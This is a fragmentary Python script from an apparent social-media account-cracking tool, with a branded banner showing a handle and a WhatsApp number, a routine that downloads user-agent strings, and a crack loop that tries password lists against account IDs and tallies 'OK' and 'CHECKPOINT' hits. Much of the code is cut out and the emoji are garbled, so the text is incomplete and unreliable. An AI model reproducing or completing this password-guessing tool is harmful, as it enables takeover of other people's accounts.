...
#Chnge Name 
	print('[[\x1b[1;92mâ€¢\x1b[1;97m] [\x1b[1;97mADil-XD]')
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/adiltoor27.txt').text
		ua=open('.bbnew.txt','w')
...
def banner():
  ...
  /  /_\  \   |  |  |  ||  | |  |                      [â€¢] NOOB CODER ðŸ¥ºâ¤ï¸                                 
 /  _____  \  |  '--'  ||  | |  `----.                Whatsapp:03246940538
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{b}ADIL-TOOR-->{P}[{k}{loop}{P}/{h}{len(id)}{P}]â€”{P}[{H}{ok}{P}]â€”{P}[{k}{cp}{x}]â€”[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel('  [red]     âœ¨ ADIL-CHECKPOINT âœ¨ [red]'))
				...
				cetak(nel('[green]      â¤ï¸âœ¨ Adil-OK â¤ï¸âœ¨[green]')) 
